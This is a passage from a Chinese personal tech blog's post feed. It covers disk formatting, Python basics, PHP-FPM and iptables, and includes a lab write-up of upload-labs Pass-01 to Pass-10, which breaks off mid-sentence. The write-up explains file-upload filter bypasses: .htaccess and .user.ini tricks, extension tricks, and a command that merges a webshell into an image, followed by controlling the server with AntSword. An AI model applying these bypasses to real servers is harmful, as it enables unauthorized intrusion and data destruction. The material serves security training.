title="总结"></a>总结</h3><p>总的来说，挂载是将分区或文件系统集成到操作系统的文件结构中的必要步骤，它确保了数据的有效访问、安全性和资源的合理管理。通过挂载，操作系统可以为用户和应用提供一种一致、安全的方式来存储和访问数据。</p><h2 id="磁盘分区格式化的原理"><a href="#磁盘分区格式化的原理" class="headerlink" title="磁盘分区格式化的原理"></a>磁盘分区格式化的原理</h2><ol><li><strong>分区表</strong>：<ul><li>磁盘通常被划分为多个分区，每个分区都有一个分区表，包含了各个分区的信息（如起始位置、大小和类型）。</li></ul></li><li><strong>文件系统的创建</strong>：<ul><li>格式化过程中，系统会在特定分区内创建一个文件系统 (如NTFS, FAT32, ext4等)。这一步会<u>确定数据的存储方式</u>，包括如何组织文件、目录结构，以及如何管理磁盘空间。</li></ul></li><li><strong>磁盘块的初始化</strong>：<ul><li>在格式化过程中，操作系统会将每个磁盘块标记为可用或不可用，并且可能会清空已有的数据（在快速格式化中，数据并未真正被删除，而是在文件系统中被标记为可用）。</li></ul></li><li><strong>引导扇区的写入</strong>：<ul><li>格式化不仅涉及文件系统数据结构的创建，还会在磁盘的开始位置写入引导扇区（Boot Sector），用于启动操作系统</li></ul></li></ol><h2 id="为什么要格式化磁盘分区"><a href="#为什么要格式化磁盘分区" class="headerlink" title="为什么要格式化磁盘分区"></a>为什么要格式化磁盘分区</h2><ol><li><strong>准备磁盘使用</strong>：<ul><li>在使用新的硬盘或新分区之前，格式化是准备该磁盘为操作系统和用户数据服务的重要步骤，确保数据能够有效存储和检索。</li></ul></li><li><strong>清理旧数据</strong>：<ul><li>格式化可以清理已有的数据，防止信息泄露，尤其是在处理二手硬盘或不再需要的数据时。</li></ul></li><li><strong>创建文件系统</strong>：<ul><li>格式化为分区创建合适的文件系统，使操作系统能够有效地管理文件和目录，从而提高操作效率。</li></ul></li><li><strong>修复文件系统</strong>：<ul><li>在某些情况下，格式化可以用于修复损坏的文件系统（通常需要重新格式化整个分区），尽管这样会导致数据丢失。</li></ul></li><li><strong>优化存储性能</strong>：<ul><li>在长时间使用后，磁盘上的数据可能会变得零散，通过重新格式化，可以优化磁盘空间的使用，提高性能。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LVM逻辑卷管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python安全开发</title>
      <link href="/2024/07/17/python-an-quan-kai-fa/"/>
      <url>/2024/07/17/python-an-quan-kai-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="Python安全开发"><a href="#Python安全开发" class="headerlink" title="Python安全开发"></a>Python安全开发</h1><p>Python官网：<a href="https://pypi.org/">PyPI · The Python Package Index</a></p><blockquote><p>Python擅长的：</p><ol><li>安全脚本开发，提高工作效率</li><li>自动化运维、日志分析等</li><li>针对特定的服务器环境，开发安全测试工具</li><li>安全基线检查</li><li>资产收集、资产管理、信息收集</li></ol></blockquote><h2 id="PIP"><a href="#PIP" class="headerlink" title="PIP"></a>PIP</h2><blockquote><p>pip主要用于在线安装第三方库</p></blockquote><p>安装：pip install xxxx</p><p>列出：pip list</p><p>过滤：pip list | findstr xxx</p><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ol><li>数字：整数、小数、负数 ，python属于弱类型语言，不强制区分数据类型</li><li>字符串：（单双引号包裹）（三引号：用于多行预定义格式）</li><li>布尔型：True/False</li><li>列表：a=[1,2,3,4] b=[“张三”,“李四”]，在PHP中叫索引数组，在JavaScript中叫数组</li><li>字典：a={‘name’:’张三’,’age’:25,’sex’:’男’,’phone’:’123123’}，在PHP中叫关联数组，在JavaScript中叫对象，python中的列表与字典，与JSON的格式完全一致</li><li>集合：与列表相似，是不重复的列表，在集合中不允许出现重复的数据</li><li>元组：tuple，与列表相同，中括号变圆括号 a=(1,2,3,4）,与列表不同的是不能修改 </li><li>对象：用class声明的</li><li>空类型：None</li></ol><h3 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h3><blockquote><p>变量名区分大小写</p><p>不允许使用中文全拼</p><p>所有的命名，必须有意义</p><p>针对函数名或变量名，超过一个单词，建议使用下划线分开，也可以使用驼峰</p><p>类名建议使用大驼峰，People，MyPhone</p></blockquote><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>#：注释一行</p><p>三个单引号或双引号：注释多行</p><h3 id="输入与输出"><a href="#输入与输出" class="headerlink" title="输入与输出"></a>输入与输出</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string='HHHHHH'</span><br><span class="line">phone=1234567</span><br><span class="line">#phone=input("请输入:")</span><br><span class="line">print(string+str(phone))</span><br><span class="line">print('%s%d' % (string,phone))//占位符的方式</span><br><span class="line">print(f'{string}{phone}')//格式化</span><br><span class="line">print('{}{}'.format(string,phone))//格式化</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FastCGI与PHP-FPM</title>
      <link href="/2024/07/11/fastcgi-yu-php-fpm/"/>
      <url>/2024/07/11/fastcgi-yu-php-fpm/</url>
      
        <content type="html"><![CDATA[<h1 id="FastCGI与PHP-FPM"><a href="#FastCGI与PHP-FPM" class="headerlink" title="FastCGI与PHP-FPM"></a>FastCGI与PHP-FPM</h1><blockquote><p>CGI:（Common Gateway Interface）是一种 Web 服务器与外部程序进行交互的标准接口，Web服务器接受请求，一个请求对应一个进程，因而<u>可能存在频繁创建和销毁进程</u></p></blockquote><blockquote><p>FastCGI：<strong>引入进程池，减少进程的创建和销毁</strong>，但是仍然一个问题，<u>就是进程池管理不够灵活</u>，假如进程池中预先创建了CGI程序，但是来了5个请求，那么会有2个请求将要等待</p></blockquote><blockquote><p>PHP-FPM（PHP FastCGI Process Manager）是 PHP 的一个 FastCGI 进程管理器，是在FastCGI之上的优化。它们之间的关系是，PHP-FPM 是 PHP 运行在 FastCGI 模式下的一个进程管理器，<strong>可以提供更灵活的进程管理，动态调整进程数</strong>，用于提供更快的 PHP 程序执行速度和更好的资源利用率。</p></blockquote><blockquote><p>Apache MPM (Multi-Processing Module) 是 Apache HTTP 服务器的一种核心模块，负责处理进程和线程管理。MPM 模块的作用是决定 Apache 服务器如何处理并发请求，从而影响服务器的性能和稳定性。不同的 MPM 模块采用不同的处理方式</p><ul><li>Prefork MPM：使用多个独立的<strong>进程</strong>处理请求，每个进程对应一个独立的进程，适用于低并发，堆内存消耗敏感的场景</li><li>Worker MPM：使用多个<strong>线程</strong>处理请求，中等并发，需求资源较少的场景</li><li>Event MPM：与worker大致差不多，多一个利用多路复用技术和事件驱动机制，适合高并发和长连接的场景，优势是线程在非活动状态时可以切换到其他连接，充分利用处理能力</li></ul><p>选择合适的 MPM 模块取决于服务器的配置和需求，不同的 MPM 模块适用于不同的场景。通过配置 Apache 的 MPM 模块，可以优化服务器的性能，提高并发处理能力和稳定性。</p></blockquote><p>通过 CGI 接口，Web 服务器（如 Apache、Nginx 等）可以与外部的 PHP 程序进行通信，实现动态 Web 页面的生成。PHP-FPM 则是一个在此过程中负责管理 PHP 进程的工具，它可以有效地管理 PHP 进程池，并提供更好的性能和稳定性。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Iptables防火墙</title>
      <link href="/2024/07/05/iptables-fang-huo-qiang/"/>
      <url>/2024/07/05/iptables-fang-huo-qiang/</url>
      
        <content type="html"><![CDATA[<h1 id="iptables防火墙"><a href="#iptables防火墙" class="headerlink" title="iptables防火墙"></a>iptables防火墙</h1><h2 id="四表五链"><a href="#四表五链" class="headerlink" title="四表五链"></a>四表五链</h2><p><img src="https://pic.imgdb.cn/item/66b1cdead9c307b7e9792589.png"></p><p><strong>默认的4个规则表</strong></p><p>raw表：确定是否对该数据包进行状态跟踪</p><p>mangle表：为数据包设置标记</p><p>nat表：修改数据包中的源、目标ip地址或端口</p><p>filter表：确定是否放行该数据包（过滤）</p><p><strong>默认的5种规则链：</strong></p><p>INPUT:处理入站数据包</p><p>OUTPUT:处理出站数据包</p><p>FORWARD:处理转发数据包</p><p>POSTROUTING:在进行路由选择后处理数据包</p><p>PREROUTING:在进行路由选择前处理数据包</p><ul><li><p>其中input、output链主要用在“主机型防火墙”中，主要针对服务器本机进行保护；</p></li><li><p>而FORWARD\POSTROUTING\PREROUTING多用在“网络型防火墙”中，如使用Linux防火墙作为网关服务器，在公司内网与Ineternet之间进行安全控制。</p></li></ul><h2 id="匹配顺序"><a href="#匹配顺序" class="headerlink" title="匹配顺序"></a>匹配顺序</h2><p>（1）<strong>规则表之间的顺序</strong>: raw mangle nat filter (从左到右）</p><p>（2）<strong>规则链之间的顺序</strong>：不同链的处理时机比较固定，顺序取决于数据包的流向。</p><p>入站数据流向： 来自外界的数据包到达防火墙后，首选被<strong>PREROUTING链</strong>处理，然后进行路由选择；如果数据包的目的地址是防火墙本机，交给<strong>INPUT链</strong>进行处理，通过以后再交给系统上层应用程序进行响应。</p><p>转发数据流向： 来自外界的数据包到达防火墙后，<strong>首选被PREROUTING</strong>链处理，然后进行路由选择；如果数据包的目标地址是其他外部地址，则交给<strong>FORWARD链</strong>进行处理，最后交<strong>给POSTROUTING链</strong>进行处理。</p><p>出站数据流向：防火墙本机向外部地址发送数据包，首选被OUTPUT链处理，然后进行路由选择，再交给<strong>POSTROUTING</strong>链进行处理。 </p><p><strong>（3）</strong>规则链内部各条防火墙规则之间的顺序：<strong>从上往下，一旦匹配，立即终止。</strong></p><h2 id="常用的管理选项"><a href="#常用的管理选项" class="headerlink" title="常用的管理选项"></a>常用的管理选项</h2><p>-A：在链尾追加一条新的规则</p><p>-I：在指定位置（或链首）插入一条新的规则</p><p>-P：设置指定链的默认策略</p><p>-L：列表查看各条规则信息</p><p>-D：删除指定位置或内容的规则-F:清空规则链内的所有规则</p><p>-h：查看iptables命令的使用帮助</p><h2 id="目标动作"><a href="#目标动作" class="headerlink" title="目标动作"></a>目标动作</h2><p>ACCEPT:放行数据包</p><p>DROP:丢弃数据包</p><p>REJECT:拒绝数据包</p><p>SNAT:修改数据包的源地址信息</p><p>DNAT:修改数据包的目标地址信息</p><h2 id="条件匹配"><a href="#条件匹配" class="headerlink" title="条件匹配"></a>条件匹配</h2><p>（1）通用匹配:</p><p>可直接使用。不依赖于其他的条件或扩展模块；</p><p>包括网络协议、IP地址、网络接口等匹配方式。</p><p>（2）协议匹配</p><p>使用“-p协议名”的形式；</p><p>协议名可使用在“letc/protocols”文件中定义的名称；</p><p>常用的协议包括tcp、 udp、icmp等。</p><p>（3）地址匹配</p><p>使用“-s源地址”、“-d目标地址”的形式；</p><p>地址可以是单个IP地址、网络地址（带掩码长度)。</p><p>（4）接口匹配</p><p>使用“-i网络接口名”、“-o网络接口名”的形式,分别对应接收、发送数据包的网络接口。</p><p>（5）隐含条件匹配 </p><p>一般以特定的协议匹配作为前提，包括端口、TCP标记、ICMP类型等匹配方式。</p><p>• 端口匹配 </p><p>使用“–sport源端口”、“–dport目标端口”的形式；</p><p>采用“端口1:端口2””的形式可以指定一个范围的端口。</p><p>• TCP标记匹配</p><p>使用“–tcp-flags检查范围被设置的标记”的形式；</p><p>如“–tcp-flags sYN,RST,ACK SYN”表示检查SYN、</p><p>RST、ACK这3个标记，只有SYN为1时满足条件。</p><p>• ICMP类型匹配</p><p>使用“–icmp-type ICMP类型”的形式；</p><p>ICMP类型可以使用类型字符串或者对应的数值，例如Echo-Request、Echo-Reply。</p><p>（5）显式条件匹配</p><p>  需要使用“-m扩展模块”的形式明确指定匹配方式。</p><p>• MAC地址匹配</p><p>使用“-m mac”结合“–mac-source MAC地址”的形式</p><p>• 多端口匹配</p><p>使用“-m multiport””结合“–sports源端口列表”或者“–dports目标端口列表”的形式</p><p>多个端口之间使用逗号“,”分隔，连续的端口也可以使用冒号“:”分隔。</p><p>• IP地址范围匹配</p><p>使用“-m iprange”结合“–src-range源IP范围”或者–dst-range目标IP范围”的形式</p><p>以“-”符号连接起始P地址、结束IP地址</p><h2 id="iptables语法格式"><a href="#iptables语法格式" class="headerlink" title="iptables语法格式"></a>iptables语法格式</h2><p><strong>iptables [-t 表名] 管理选项 [链名] [条件匹配] [-j 目标动作]</strong></p><h2 id="iptables基本配置案例"><a href="#iptables基本配置案例" class="headerlink" title="iptables基本配置案例"></a>iptables基本配置案例</h2><p>（1）查看的是fileter表中的信息，并显示行号 </p><p># iptables -L –line-number</p><p># iptables -L INPUT –line-number</p><p>（2） 没有-t 指定表名，默认清空fileter表中的信息</p><p>   # iptables -F</p><p>（3） 在<strong>链首</strong>追加一条规则</p><p>   # iptables -t filter -I INPUT -d 192.168.181.151 -p tcp –dport 80 -j ACCEPT</p><p>（4） 在<strong>第一个位置</strong>插入一条规则</p><p># iptables -I INPUT -s 192.168.10.1 -d 192.168.10.132 -p tcp –dport 22 -j ACCEPT </p><p>（5） 在<strong>第5条规则前</strong>插入一条规则</p><p># iptables -t filter -I INPUT <strong>5</strong> -d 192.168.181.151 -p tcp –dport 22 -j REJECT </p><p>（6） 删除INPUT链中的第一条规则</p><p># iptables -D INPUT 1 </p><p>（7） 设置默认策略为拒绝所有连接</p><p># iptables -P INPUT DROP  </p><p>（8） 设置默认策略为允许已建立的规则进行连接</p><p># iptables -P INPUT ACCEPT </p><p>（9） 查看帮助信息</p><p># iptables -h </p><p>（10）查看iptables手册</p><p># man iptables  </p><p>（11）拒绝192.168.0.1访问web服务</p><p># iptables -A INPUT -s 192.168.0.1 -p tcp –dport 80 -j REJECT</p><p>（12）拒绝192.168.0.0/24ping通服务器</p><p># iptables -A INPUT -s 192.168.0.0/24 -p icmp -j REJECT</p><p>（13）允许192.168.1.0/24访问服务器的21与80端口</p><p># iptables -A INPUT -s 192.168.1.0/24 <strong>-m multiport</strong> -p tcp –dports 21,80 -j ACCEPT</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul><li><p>不指定表名时，默认表示**<u>filter表</u>**</p></li><li><p>不指定链名时，默认表示该表内所有链</p></li><li><p>除非设置规则链的缺省策略,否则需要指定匹配条件</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Iptables防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2024/06/17/upload-labs/"/>
      <url>/2024/06/17/upload-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>使用工具：<br>burpsuite<br>中国蚁剑</p><h2 id="Pass-01-前端js绕过"><a href="#Pass-01-前端js绕过" class="headerlink" title="Pass-01 前端js绕过"></a>Pass-01 前端js绕过</h2><blockquote><p>前端JS代码对上传文件合法性的验证</p></blockquote><ol><li>先上传一个不合法php文件来测试</li></ol><p><img src="https://pic.imgdb.cn/item/666fe4a3d9c307b7e9085db1.png"></p><p><img src="https://pic.imgdb.cn/item/666fdd20d9c307b7e9fa577e.png"></p><ol start="2"><li>该文件类型不允许上传</li></ol><p><img src="https://pic.imgdb.cn/item/666fdd5dd9c307b7e9fabe43.png"></p><ol start="3"><li>burpsuite未抓到包，则证明上传的文件在前端就被拦截，还未到传给服务器的步骤</li></ol><img src="https://pic.imgdb.cn/item/666fde6ad9c307b7e9fc8a34.png" style="zoom:67%;"><ol start="4"><li>他只允许图片（jpg、png）及动图（gif）文件上传，那么我们就将文件改为图片的后缀来上传，从而绕过前端的拦截</li></ol><p><img src="https://pic.imgdb.cn/item/666fdf36d9c307b7e9ff1840.png"></p><ol start="5"><li>能抓到包，证明绕过了前端验证</li></ol><p><img src="https://pic.imgdb.cn/item/666fe4d3d9c307b7e908b3fd.png"></p><ol start="6"><li>然后将文件后缀名从jpg重新改回php上传，一句话木马就植入服务器了，这里看到打开图片连接，实际上是php文件</li></ol><p><img src="https://pic.imgdb.cn/item/666fe50fd9c307b7e9092267.png"></p><ol start="7"><li>可以用后门连接工具（蚁剑）来连接并控制服务器，输入url和连接密码（也就是post传入的参数）</li></ol><p><img src="https://pic.imgdb.cn/item/666fe546d9c307b7e909882e.png"></p><ol start="8"><li>连接成功，并添加，打开数据记录就可以控制服务器目录</li></ol><p><img src="https://pic.imgdb.cn/item/666fe5fed9c307b7e90ace82.png"></p><ol start="9"><li>可以对服务器的目录进行操作，此处演示删除操作</li></ol><p><img src="https://pic.imgdb.cn/item/666fe642d9c307b7e90b439f.png"></p><blockquote><p>另一个方法：</p><p>在网页前端设置中禁用JavaScript，就可以正常上传php文件了</p></blockquote><ol><li>鼠标右键-检查-设置-禁用JavaScript</li></ol><p>设置：</p><p><img src="https://pic.imgdb.cn/item/6673d15cd9c307b7e981140b.png"></p><p>禁用：</p><p><img src="https://pic.imgdb.cn/item/6673d1b7d9c307b7e981b7b0.png"></p><h2 id="Pass-02-content-type绕过"><a href="#Pass-02-content-type绕过" class="headerlink" title="Pass-02 content-type绕过"></a>Pass-02 content-type绕过</h2><blockquote><p>基本流程第一步先上传php文件去尝试，回显文件类型错误，猜测通过content-type的内容来拦截不合法的文件格式上传</p></blockquote><p><img src="https://pic.imgdb.cn/item/6673d7cfd9c307b7e98e0866.png"></p><ol><li>用burpsuite先抓包，拦下数据包，然后将php文件的content-type内容改为图像对应的内容（image/jpeg）上传，即可绕过</li></ol><p>原始包内容：</p><p><img src="https://pic.imgdb.cn/item/6673d585d9c307b7e989d6f1.png"></p><p>修改后：</p><p><img src="https://pic.imgdb.cn/item/6673d5b1d9c307b7e98a21e9.png"></p><p>然后放行，显示上传成功</p><p>同样可以用蚁剑来连接</p><h2 id="Pass-03-特殊后缀绕过"><a href="#Pass-03-特殊后缀绕过" class="headerlink" title="Pass-03 特殊后缀绕过"></a>Pass-03 特殊后缀绕过</h2><blockquote><p>先上传php文件去尝试，回显不允许上传的文件后缀名，猜测对后缀名写了黑名单，来拦截不合法的文件格式上传</p><p>可以通过上传同样可以被解析为php文件的一些后缀，类似php3、php5、phtml等，是否能成功取决于中间件（apache）的配置文件中是否有设置</p></blockquote><p><img src="https://pic.imgdb.cn/item/6673d878d9c307b7e98f2e6b.png"></p><blockquote><p>更改apache配置文件：设置什么样的文件后缀可以php的方式来解析</p></blockquote><ul><li>步骤：打开配置文件-（httpd-config）-找到addtype</li></ul><p><img src="https://pic.imgdb.cn/item/6673dc06d9c307b7e995e954.png"></p><ul><li>找到addtype，取消注释，添加类型</li></ul><p><img src="https://pic.imgdb.cn/item/6673dd03d9c307b7e997d319.png"></p><blockquote><p>如果还是不行，那么考虑是php的版本问题，切换到不带nts的低版本，就可以用蚁剑连接成功</p><p>nts（非多线程安全）、ts（多线程安全）</p></blockquote><ol><li><p>上传php文件，在burpsuite中将后缀名改为php5（php3，phtml）然后放行，关闭抓包</p></li><li><p>打开图片链接，并且复制图片链接，在蚁剑上连接</p></li></ol><h2 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04 .htaccess绕过"></a>Pass-04 .htaccess绕过</h2><blockquote><p>老样子，先上传php文件，看回显，文件不允许上传</p><p>作为练习，那么看源码来分析</p></blockquote><p><img src="https://pic.imgdb.cn/item/6673df89d9c307b7e99cce97.png"></p><p>源码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini"); //后缀名黑名单</span><br><span class="line">        $file_name = trim($_FILES['upload_file']['name']); //去除文件名中的前和后空格</span><br><span class="line">        $file_name = deldot($file_name);   //删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, '.');   //从文件名中提取文件的扩展名</span><br><span class="line">        $file_ext = strtolower($file_ext);    //转换为小写</span><br><span class="line">        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext);    //收尾去空</span><br></pre></td></tr></tbody></table></figure><p>​.htaccess文件在站点的根目录下面，不是在apache目录下，但它属于apache的一个局部配置文件，它负责相关目录下的网页配置，修改后即生效。而httpd.conf是apache全局主配置文件，影响整个服务器，修改后需重启服务器才生效</p><p>​通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</p><p>​其中.htaccess文件中的“SetHandler application/x-http-php”的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行，不符合规则则报错。.htaccess通常用于伪静态的一个转换。           </p><p><strong>前提条件：</strong>目标服务器apache必须开启“mod_rewrite”模块和“AllowOverride ALL”。</p><p><img src="https://pic.imgdb.cn/item/6673e634d9c307b7e9aa5fdf.png"></p><p><img src="https://pic.imgdb.cn/item/6673e649d9c307b7e9aa8720.png"></p><p><img src="https://pic.imgdb.cn/item/6673eef5d9c307b7e9b9fcc0.png"></p><ol><li>写一个.htaccess文件并上传，内容为：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php   //将所有文件都解析成PHP文件</span><br><span class="line">或者</span><br><span class="line">AddType application/x-httpd-php .jpg .txt   //将jpg或txt以php来解析</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>将一句话木马的php后缀改为jpg或者txt，然后上传，蚁剑连接的时候后缀就是jpg，可以连接</li></ol><blockquote><p> 也可以将php文件合并到图片文件中一起上传</p></blockquote><p><u>方法1：</u></p><ul><li>在文件当前目录打开cmd，输入命令合并两个文件</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy shell.php+1.jpg/b 000.jpg</span><br></pre></td></tr></tbody></table></figure><p>/b:二进制</p><p>000.jpg：合并之后的文件</p><p><u>方法2：</u></p><ul><li>burpsuite抓包，上传一个图片，在图片的内容最后加上一句话木马内容，然后上传</li></ul><blockquote><p>当然，如果只看这道题，还有一个方法绕过</p></blockquote><ul><li><p>抓包之后将文件名改为“shell.php. .”（加了点 空格 点），是根据源码过滤规则来绕过的，过滤之后发往服务器的文件名是“shell.php.”，然后需要知道windows的命名规则中后缀名之后的”空格”和”.”是会被去除的</p></li><li><p>所以服务器中保存到文件名为“shell.php”</p></li></ul><h2 id="Pass-05-user-ini绕过"><a href="#Pass-05-user-ini绕过" class="headerlink" title="Pass-05 .user.ini绕过"></a>Pass-05 .user.ini绕过</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><ul><li><p>.htaccess<br>  作用:分布式配置文件，一般用于URL重写、认证、访问控制等<br>  作用范围:特定目录(一般是网站根目录)及其子目录<br>  优先级:<strong>较高</strong>，可覆盖 Apache的主要配置文件(httpd-conf)<br>  生效方式:修改后立刻生效</p></li><li><p>httpd-conf<br>  作用:包含 Apache·HTTP服务器的全局行为和默认设置<br>  作用范围:整个服务器<br>  优先级:较低<br>  生效方式:管理员权限，重启服务器后生效</p></li><li><p>.user.ini<br>  作用:特定于用户或特定目录的配置文件,通常位于Web应用程序的根目录下，它用于覆盖或追加全局配置文件(如php.ini)中的PHP配置选项。<br>  作用范围:存放该文件的目录以及其子目录<br>  优先级:<strong>较高</strong>，可以覆盖 php.ini<br>  生效方式:立即生效</p></li><li><p>php.inie<br>  作用:存储了对整个PHP环境生效的配置选项。它通常位于PHP安装目录中<br>  作用范围:所有运行在该PHP环境中的PHP请求<br>  优先级:·较低<br>  生效方式:重启 php或 web 服务器</p></li></ul><blockquote><p>.user.ini可以生效的前提：</p></blockquote><ul><li>php版本最好是7.x的版本</li><li>Server API为CGI/FastCGI（通过phpinfo查看）</li></ul><blockquote><p>.user.ini文件上传漏洞的前提：</p></blockquote><ul><li>.user.ini可以生效</li><li>并且上传目录由php文件</li></ul><p>写法：</p><p>auto_prepend_file=shell.txt（这个文件中包含php内容）</p><p>A：echo“hello”.php </p><p>B：echo“world”.txt</p><p>auto_prepend_file=B.txt………………hello world</p><ol><li>写一个.user.ini文件，此文件的作用是在该目录下上传文件时都会预先加载文件中的内容，此处内容则是预先加载shell.jpg文件去包含一句话木马，这意味着在每个 PHP 脚本执行之前，都会先执行 shell.jpg 文件，然后将其上传</li></ol><p><img src="https://pic.imgdb.cn/item/667698dcd9c307b7e9882677.png"></p><ol start="2"><li>然后再上传shell.jpg文件（包含一句话木马），为了方便查看加一句显示的语句</li></ol><p><img src="https://pic.imgdb.cn/item/66769a87d9c307b7e98aede6.png"></p><ol start="3"><li>上传的目录中自己包含一个readme.php文件，在网页上访问此文件，就会首先加载shell.jpg文件，则会输出“上传成功”，此处因为编码方式不同出现乱码，但是其实已经包含成功</li></ol><p><img src="https://pic.imgdb.cn/item/66769b08d9c307b7e98bb61a.png"></p><blockquote><p>同样，根据这道题的源码来看，可以通过点空格点来绕过</p></blockquote><h2 id="Pass-06-大写绕过"><a href="#Pass-06-大写绕过" class="headerlink" title="Pass-06 大写绕过"></a>Pass-06 大写绕过</h2><blockquote><p>查看源码，发现没有将文件扩展名转为小写的代码，可以使用大写绕过</p></blockquote><ul><li>上传文件，burpsuite抓包，然后将文件后缀名任意字母改为大写，然后上传</li></ul><p><strong>注意</strong>：版本要调低，这里我用的是php5.4.45，版本太高无法连接</p><h2 id="Pass-07-空格绕过"><a href="#Pass-07-空格绕过" class="headerlink" title="Pass-07 空格绕过"></a>Pass-07 空格绕过</h2><blockquote><p>查看源码，发现没有将文件扩展名去除首尾空格的代码，可以使用空格绕过</p></blockquote><ul><li>上传文件，burpsuite抓包，然后将文件后缀名最后加上空格，然后上传</li></ul><h2 id="Pass-08-后缀加点绕过"><a href="#Pass-08-后缀加点绕过" class="headerlink" title="Pass-08 后缀加点绕过"></a>Pass-08 后缀加点绕过</h2><blockquote><p>查看源码，发现没有将文件扩展名去除末尾点的代码，可以使用后缀加点绕过</p></blockquote><ul><li><p>上传文件，burpsuite抓包，然后将文件后缀名最后加上一个点，然后上传</p></li><li><p>前面这三种类型为什么能绕过呢？原理就是增加特殊字符，从而绕开黑名单的过滤</p></li></ul><h3 id="额外数据流"><a href="#额外数据流" class="headerlink" title="额外数据流"></a>额外数据流</h3><p>​在Windows操作系统中，当你看到文件名后跟着”::$DATA”时，它表示文件的一个附加数据流(Alternate·DataStream，ADS)。数据流是一种用于在文件内部存储额外数据的机制。<br>​在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是WindowS·NT·文件系统(NTFS)支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过在文件名后面添加”::DATA”来访问。<br>​例如，”1.txt”是一个文件，而”1.txt::$DATA”是这个文件的一个附加数据流。这样的数据流可以用于存储文件的元数据、备份信息、标签等。<br>​需要注意的是，<strong>大多数常规的文件操作工具不会意识到这些额外的数据流，而只会处理默认</strong><br><strong>的数据流</strong>。要访问或操作这些附加数据流，通常需要使用特定的命令行工具或编程接口。</p><p>写入方法：</p><p>echo 内容 &gt;&gt;文件名:数据流名</p><p>type 文件名 &gt;&gt;文件名:数据流名</p><p>查看方法：</p><p>notepad 文件名:数据流名</p><p>例子：</p><ol><li>创建一个txt文件，并写入内容</li></ol><p><img src="https://pic.imgdb.cn/item/668913c9d9c307b7e90db9f4.png"></p><ol start="2"><li>给该文件写一个附加数据流，用notepad查看文件只显示文件内容，不显示附加数据流内容</li></ol><p><img src="https://pic.imgdb.cn/item/6689143cd9c307b7e90e8850.png"></p><p><img src="https://pic.imgdb.cn/item/668913c9d9c307b7e90db9f4.png"></p><ol start="3"><li>按此方法查看，就可以查看附加数据流，“你好”</li></ol><p><img src="https://pic.imgdb.cn/item/6689155ed9c307b7e910898f.png"></p><ol start="4"><li>type：将2.txt写入1.txt的额外数据流</li></ol><p><img src="https://pic.imgdb.cn/item/6689174ed9c307b7e9157dc2.png"></p><h2 id="Pass-09-DATA绕过"><a href="#Pass-09-DATA绕过" class="headerlink" title="Pass-09 ::$DATA绕过"></a>Pass-09 ::$DATA绕过</h2><blockquote><p>::$DATA结尾的是文件附加数据流，在PHP中文件附加数据流是不会验证文件后缀的，因为他仅表示一个文件流，不是一个文件</p></blockquote><ul><li><p>上传文件，burpsuite抓包，然后将文件后缀名最后加上::$DATA，然后上传，因为他已经是一个文件附加数据流了，所有不是文件，不检查文件后缀名</p></li><li><p>上传之后，Windows操作系统的会将后缀名的::$DATA去除，也就成了文件，而不再是文件数据流了</p></li></ul><h2 id="Pass-10-点空格点绕过"><a href="#Pass-10-点空格点绕过" class="headerlink" title="Pass-10 点空格点绕过"></a>Pass-10 点空格点绕过</h2><blockquote><p>查看源码，根据代码执行顺序，可以看出(php. 